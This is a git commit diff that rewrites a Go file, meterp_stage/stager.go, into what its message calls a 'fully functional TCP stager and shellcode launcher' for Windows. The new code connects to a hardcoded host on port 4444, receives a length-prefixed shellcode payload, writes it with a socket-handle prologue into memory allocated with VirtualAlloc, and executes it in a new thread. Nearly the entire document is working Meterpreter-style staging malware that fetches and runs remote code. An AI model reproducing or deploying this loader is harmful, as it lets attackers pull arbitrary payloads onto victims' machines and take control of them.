62107f5feb5a862a4de9199cc9f1c92d2081af92
b00stfr3ak <goduke44@gmail.com>
2015-04-14 10:23:06 -0700

    Fully Functional TCP stager and Shellcode launcher

--- meterp_stage/stager.go
+++ meterp_stage/stager.go
@@ -1,88 +1,62 @@
 package main
 
 import (
-        "flag"
-        "fmt"
-        "net"
-        "os"
-        "syscall"
-        "unsafe"
+	"encoding/binary"
+	"fmt"
+	"github.com/b00stfr3ak/w32"
+	"log"
+	"syscall"
+	"unsafe"
 )
-
-const (
-        MEM_COMMIT  = 0x1000
-        MEM_RESERVE = 0x2000
-
-        PAGE_EXECUTE_READWRITE = 0x40
-)
-
-var (
-        kernel32     = syscall.MustLoadDLL("kernel32.dll")
-        VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
-)
-
-func SysAlloc(n uintptr) (uintptr, error) {
-        addr, _, err := VirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-        if addr == 0 {
-                return 0, err
-        }
-        return addr, nil
-}
-
-const SIZE = 770100
-
-type Holder struct {
-        offset  int
-        buffer  unsafe.Pointer
-        //buffer  *[SIZE]byte
-}
 
 func main() {
-        host := flag.String("host", "127.0.0.1", "Host to connect to")
-        port := flag.String("port", "4444", "Port to connect to")
-        flag.Parse()
-        server := *host + ":" + *port
-        address, err := net.ResolveTCPAddr("tcp", server)
-        if err != nil {
-                fmt.Println(err)
-                os.Exit(1)
-        }
-        conn, err := net.DialTCP("tcp", nil, address)
-        if err != nil {
-                fmt.Println(err)
-                os.Exit(1)
-        }
-        addr, err := SysAlloc(SIZE)
-        if err != nil {
-                fmt.Println(err)
-                os.Exit(1)
-        }
-        holder := &Holder{0, unsafe.Pointer(addr)}
-        println("Allocated Memory")
-        b := (*[1]byte)(holder.buffer)
-        b[0] = 0xBF
-        holder.offset++
-        println("Wrote ASM")
-        recv(conn, 4, holder)
-        println("First 4 bytes")
-        recv(conn, 1024, holder)
-        println("Rest of the Payload")
-        //syscall.Syscall(addr, 3, 3, 5, 2)
-}
-
-func recv(conn net.Conn, size int, holder *Holder) {
-        reply := make([]byte, size)
-        length, err := conn.Read(reply)
-        if err != nil {
-                println(err)
-                os.Exit(1)
-        }
-        b := (*[SIZE]byte)(holder.buffer)
-        for _, value := range reply {
-                b[holder.offset] = value
-                holder.offset += 1
-        }
-        if length == 1024 {
-                recv(conn, 1024, holder)
-        }
+	var d syscall.WSAData
+	syscall.WSAStartup(uint32(0x202), &d)
+	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
+	addr := syscall.SockaddrInet4{Port: 4444, Addr: [4]byte{192, 168, 9, 144}}
+	syscall.Connect(fd, &addr)
+	fmt.Println("Connected to server")
+	var buf [4]byte
+	dataBuf := syscall.WSABuf{Len: uint32(4), Buf: &buf[0]}
+	flags := uint32(0)
+	qty := uint32(0)
+	syscall.WSARecv(fd, &dataBuf, 1, &qty, &flags, nil, nil)
+	scLength := binary.LittleEndian.Uint32(buf[:])
+	fmt.Println("shellcode length is ", scLength)
+	sc := make([]byte, scLength)
+	var sc2 []byte
+	dataBuf = syscall.WSABuf{Len: scLength, Buf: &sc[0]}
+	flags2 := uint32(0)
+	qty2 := uint32(0)
+	total := uint32(0)
+	for total < scLength {
+		syscall.WSARecv(fd, &dataBuf, 1, &qty2, &flags2, nil, nil)
+		for i := 0; i < int(qty2); i++ {
+			sc2 = append(sc2, sc[i])
+		}
+		total += qty2
+	}
+	mem, err := win32.VirtualAlloc(uintptr(scLength + 5))
+	if err != nil {
+		log.Fatalf("Can't create buffer %s", err)
+	}
+	fmt.Println("Created buffer")
+	b := (*[800000]byte)(unsafe.Pointer(mem))
+	fmt.Println("Created byte array to virtualalloc")
+	m := (uintptr)(unsafe.Pointer(fd))
+	b[0] = 0xBF
+	b[1] = byte(m)
+	b[2] = 0x00
+	b[3] = 0x00
+	b[4] = 0x00
+	for x, s := range sc2 {
+		b[x+5] = s
+	}
+	fmt.Println("wrote shellcode to buffer")
+	//syscall.Syscall(mem, 0, 0, 0, 0)
+	var threadID uint = 0
+	hand := win32.CreateThread(0, 0, unsafe.Pointer(mem),
+		0, 0, &threadID)
+	println("created thread")
+	win32.WaitForSingleObject(hand, 0xFFFFFFF)
 }
